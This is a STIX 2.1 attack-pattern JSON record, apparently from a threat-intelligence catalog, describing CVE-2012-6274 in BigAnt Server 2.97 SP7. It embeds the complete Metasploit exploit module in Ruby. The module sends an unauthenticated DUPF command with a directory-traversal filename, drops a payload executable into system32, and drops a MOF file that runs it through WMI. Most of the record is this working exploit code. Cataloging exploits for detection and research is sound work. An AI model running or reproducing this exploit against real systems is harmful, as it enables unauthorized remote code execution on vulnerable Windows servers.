{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8de8e3ad-e89b-4689-9a56-a92421f3652f",
    "created": "2024-08-14T16:46:31.331701Z",
    "modified": "2024-08-14T16:46:31.331705Z",
    "name": "BigAnt Server DUPF Command Arbitrary File Upload",
    "description": " This exploits an arbitrary file upload vulnerability in BigAnt Server 2.97 SP7. A lack of authentication allows to make unauthenticated file uploads through a DUPF command. Additionally the filename option in the same command can be used to launch a directory traversal attack and achieve arbitrary file upload.  The module uses the Windows Management Instrumentation service to execute an arbitrary payload on vulnerable installations of BigAnt on Windows XP and 2003. It has been successfully tested on BigAnt Server 2.97 SP7 over Windows XP SP3 and 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bigant_server_dupf_upload.rb",
            "external_id": "bigant_server_dupf_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6274"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BigAnt Server DUPF Command Arbitrary File Upload',\n      'Description'    => %q{\n          This exploits an arbitrary file upload vulnerability in BigAnt Server 2.97 SP7.\n        A lack of authentication allows to make unauthenticated file uploads through a DUPF\n        command. Additionally the filename option in the same command can be used to launch\n        a directory traversal attack and achieve arbitrary file upload.\n\n        The module uses the Windows Management Instrumentation service to execute an\n        arbitrary payload on vulnerable installations of BigAnt on Windows XP and 2003. It\n        has been successfully tested on BigAnt Server 2.97 SP7 over Windows XP SP3 and 2003\n        SP2.\n      },\n      'Author'         =>\n        [\n          'Hamburgers Maccoy', # Vulnerability discovery\n          'juan vazquez'       # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6274' ],\n          [ 'US-CERT-VU', '990652' ],\n          [ 'BID', '57214' ],\n          [ 'OSVDB', '89342' ]\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'BigAnt Server 2.97 SP7', { } ]\n        ],\n      'DefaultTarget' => 0,\n      'DefaultOptions'  =>\n        {\n          'WfsDelay' => 10\n        },\n      'DisclosureDate' => '2013-01-09'))\n\n    register_options(\n      [\n        Opt::RPORT(6661),\n        OptInt.new('DEPTH', [true, \"Levels to reach base directory\", 6])\n      ])\n\n  end\n\n  def upload_file(filename, content)\n\n    random_date = \"#{rand_text_numeric(4)}-#{rand_text_numeric(2)}-#{rand_text_numeric(2)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)}\"\n\n    dupf = \"DUPF 16\\n\"\n    dupf << \"cmdid: 1\\n\"\n    dupf << \"content-length: #{content.length}\\n\"\n    dupf << \"content-type: Appliction/Download\\n\"\n    dupf << \"filename: #{\"\\\\..\" * datastore['DEPTH']}\\\\#{filename}\\n\"\n    dupf << \"modified: #{random_date}\\n\"\n    dupf << \"pclassid: 102\\n\"\n    dupf << \"pobjid: 1\\n\"\n    dupf << \"rootid: 1\\n\"\n    dupf << \"sendcheck: 1\\n\\n\"\n    dupf << content\n\n    print_status(\"sending DUPF\")\n    connect\n    sock.put(dupf)\n    res = sock.get_once\n    disconnect\n    return res\n\n  end\n\n  def exploit\n\n    peer = \"#{rhost}:#{rport}\"\n\n    # Setup the necessary files to do the wbemexec trick\n    exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n    exe      = generate_payload_exe\n    mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n    mof      = generate_mof(mof_name, exe_name)\n\n    print_status(\"Sending HTTP ConvertFile Request to upload the exe payload #{exe_name}\")\n    res = upload_file(\"WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    if res and res =~ /DUPF/ and res =~ /fileid: (\\d+)/\n      print_good(\"#{exe_name} uploaded successfully\")\n    else\n      if res and res =~ /ERR 9/ and res =~ /#{exe_name}/ and res =~ /lasterror: 183/\n        print_error(\"Upload failed, check the DEPTH option\")\n      end\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to upload #{exe_name}\")\n    end\n\n    print_status(\"Sending HTTP ConvertFile Request to upload the mof file #{mof_name}\")\n    res = upload_file(\"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    if res and res =~ /DUPF/ and res =~ /fileid: (\\d+)/\n      print_good(\"#{mof_name} uploaded successfully\")\n      register_file_for_cleanup(exe_name)\n      register_file_for_cleanup(\"wbem\\\\mof\\\\good\\\\#{mof_name}\")\n    else\n      if res and res =~ /ERR 9/ and res =~ /#{exe_name}/ and res =~ /lasterror: 183/\n        print_error(\"Upload failed, check the DEPTH option\")\n      end\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to upload #{mof_name}\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-09",
    "x_mitre_platforms": [
        "win'"
    ]
}